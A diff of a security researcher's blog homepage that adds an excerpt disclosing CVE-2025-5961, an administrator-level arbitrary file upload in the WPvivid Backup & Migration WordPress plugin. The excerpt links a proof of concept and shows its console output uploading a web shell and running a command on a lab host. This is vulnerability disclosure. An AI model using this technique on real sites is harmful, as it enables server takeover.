@@ -74,7 +74,7 @@
 <meta property="og:url" content="https://ryankozak.com/" />
 
 
-<meta property="og:updated_time" content="2025-05-23T05:30:12Z" />
+<meta property="og:updated_time" content="2025-06-09T05:30:12Z" />
 
 
 <link rel="sitemap" type="application/xml" title="Sitemap" href='https://ryankozak.com/sitemap.xml' />
@@ -159,7 +159,7 @@
   "@id":    "https:\/\/ryankozak.com\/#ryan-kozak",
   "name":   "Ryan Kozak",
   "jobTitle": "Offensive Security Researcher",
-  "description": "Offensive security engineer and researcher, specialising in web, linux, and other things interesting at the time."
+  "description": "Offensive security engineer and researcher, specialising in web, linux, and other things interesting at the time.",
   "alumniOf": "California State University Sacramento",
   "url":    "https:\/\/ryankozak.com\/",
   "image":  "\/images\/ryan‑kozak.jpg",
@@ -267,6 +267,10 @@
                         </li>
                         
                             <li class="bullet">
+                                <a href="https://ryankozak.com/posts/cve-2025-5961/">Migration, Backup, Staging – WPvivid Backup &amp; Migration &lt;= 0.9.116 - Authenticated (Administrator&#43;) Arbitrary File Upload</a>
+                            </li>
+                        
+                            <li class="bullet">
                                 <a href="https://ryankozak.com/posts/cve-2025-5058/">eMagicOne Store Manager for WooCommerce &lt;= 1.2.5 - Unauthenticated Arbitrary File Upload via set_image Task</a>
                             </li>
                         
@@ -280,10 +284,6 @@
                         
                             <li class="bullet">
                                 <a href="https://ryankozak.com/posts/cve-2025-4336/">eMagicOne Store Manager for WooCommerce &lt;= 1.2.5- Unauthenticated Arbitrary File Upload via set_file Task</a>
-                            </li>
-                        
-                            <li class="bullet">
-                                <a href="https://ryankozak.com/posts/cve-2025-47550/">Instantio - Wordpress Plugin &lt;= 3.3.16 - Authenticated (Admin&#43;) Arbitrary File Upload via ins_options_save</a>
                             </li>
                         
                     
@@ -361,6 +361,92 @@
                 <div class="posts">
     
     
+    <article class="post">
+        <div class="info">
+  <h1 class="post-title">
+    <a href="https://ryankozak.com/posts/cve-2025-5961/">Migration, Backup, Staging – WPvivid Backup &amp; Migration &lt;= 0.9.116 - Authenticated (Administrator&#43;) Arbitrary File Upload</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      
+      <time datetime=" 2025-06-09T05:30:12Z" class="post-date">
+        June 9, 2025
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>3 mins read</span>
+      </span>
+    </div>
+
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+        
+        <h3 id="cve-2025-5961">CVE-2025-5961</h3>
+<p>The <a href="https://wordpress.org/plugins/wpvivid-backuprestore/" target="_blank">wpvivid-backuprestore</a> plugin does not sanitize the file types of the <code>wpvivid_upload_import_files</code> action, allowing administrators or above to upload arbitrary files and potentially gain code execution on the server. NOTE: Uploaded files are only accessible on WordPress instances running on the NGINX web server as the existing .htaccess within the target file upload folder prevents access on Apache servers.</p>
+<h2 id="tldr-exploits">TL;DR Exploits</h2>
+<ul>
+<li>A POC <a href="https://github.com/d0n601/CVE-2025-5961/blob/master/CVE-2025-5961.py" target="_blank">CVE-2025-5961.py</a> is provided to demonstrate an administrator uploading a web shell named <code>hack.php</code>.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> python3 ./CVE-2025-5961.py https://lab1.hacker admin password
+</span></span><span style="display:flex;"><span>Logging into: https://lab1.hacker/wp-admin
+</span></span><span style="display:flex;"><span>Extracting nonce values...
+</span></span><span style="display:flex;"><span>ajax_nonce: e4d4bec9f0
+</span></span><span style="display:flex;"><span>Uploading web shell: hack.php
+</span></span><span style="display:flex;"><span>{&#34;result&#34;:&#34;success&#34;}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Web Shell At: https://lab1.hacker/wp-content/wpvividbackups/ImportandExport/hack.php
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Executing test command: ip addr
+</span></span><span style="display:flex;"><span>&lt;pre&gt;1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+</span></span><span style="display:flex;"><span>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+</span></span><span style="display:flex;"><span>    inet 127.0.0.1/8 scope host lo
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span>    inet6 ::1/128 scope host 
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000
+</span></span><span style="display:flex;"><span>    link/ether 08:00:27:5b:34:2f brd ff:ff:ff:ff:ff:ff
+</span></span><span style="display:flex;"><span>    altname enp0s3
+</span></span><span style="display:flex;"><span>    inet 10.0.2.15/24 metric 100 brd 10.0.2.255 scope global dynamic eth0
+</span></span><span style="display:flex;"><span>       valid_lft 78309sec preferred_lft 78309sec
+</span></span><span style="display:flex;"><span>    inet6 fd00::a00:27ff:fe5b:342f/64 scope global dynamic mngtmpaddr noprefixroute 
+</span></span><span style="display:flex;"><span>       valid_lft 86105sec preferred_lft 14105sec
+</span></span><span style="display:flex;"><span>    inet6 fe80::a00:27ff:fe5b:342f/64 scope link 
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span>3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000
+</span></span><span style="display:flex;"><span>    link/ether 08:00:27:39:ea:eb brd ff:ff:ff:ff:ff:ff
+</span></span><span style="display:flex;"><span>    altname enp0s8
+</span></span><span style="display:flex;"><span>    inet 192.168.56.56/24 brd 192.168.56.255 scope global eth1
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span>    inet6 fe80::a00:27ff:fe39:eaeb/64 scope link 
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span>4: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default 
+</span></span><span style="display:flex;"><span>    link/ether 02:42:63:2d:a4:f2 brd ff:ff:ff:ff:ff:ff
+</span></span><span style="display:flex;"><span>    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span>&lt;/pre&gt;
+</span></span></code></pre></div><h2 id="details">Details</h2>
+<p>The <code>wpvivid_upload_import_files</code> action calls the <code>upload_files</code> function on line <a href="https://plugins.trac.wordpress.org/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid-export-import.php#L2210" target="_blank">2210</a> of <code>/wp-content/plugins/wpvivid-backuprestore/includes/class-wpvivid-export-import.php</code> without enforcing any file type validation.</p>
+        
+        <div class="read-more-link">
+            <a href="/posts/cve-2025-5961/">Read More…</a>
+        </div>
+        
+        
+    </article>
     <article class="post">
         <div class="info">
   <h1 class="post-title">
@@ -872,53 +958,6 @@
         
         <div class="read-more-link">
             <a href="/posts/hack-the-box-armageddon-writeup/">Read More…</a>
-        </div>
-        
-        
-    </article>
-    <article class="post">
-        <div class="info">
-  <h1 class="post-title">
-    <a href="https://ryankozak.com/posts/hack-the-box-ophiuchi-writeup/">Hack the Box Ophiuchi Writeup</a>
-  </h1>
-
-  <div class="headline">
-    <div>
-      
-      
-      <time datetime=" 2021-07-16T16:37:47-0700" class="post-date">
-        July 16, 2021
-      </time>
-      
-      <span> - </span>
-      <span class="reading-time">
-        
-          
-        
-
-        <span>6 mins read</span>
-      </span>
-    </div>
-
-    
-  </div>
-
-  
-  
-
-  
-</div>
-
-        
-        <p><img src="/posts/images/hack-the-box-ophiuchi-writeup/badge.png" alt="badge"></p>
-<h1 id="introduction">Introduction</h1>
-<p>Ophiuchi is a Medium box with a weird name to pronounce. The initial foothold was straight forward but fun, the user flag reminds us to go back to the basics, and the root flag is a difficult mind game for those of us that haven&rsquo;t even been exposed to the technology.</p>
-<h1 id="information-gathering">Information Gathering</h1>
-<h2 id="port-scan-nmapautomator">Port Scan: nmapAutomator</h2>
-<p>We begin our reconnaissance by running <em><a href="https://github.com/21y4d/nmapAutomator" target="_blank">nmapAutomator</a></em> via <code>sudo ./nmapAutomator.sh 10.10.10.227 All</code>. Among many other things, this runs our port scans with increasing comprehensiveness.</p>
-        
-        <div class="read-more-link">
-            <a href="/posts/hack-the-box-ophiuchi-writeup/">Read More…</a>
         </div>
         
         
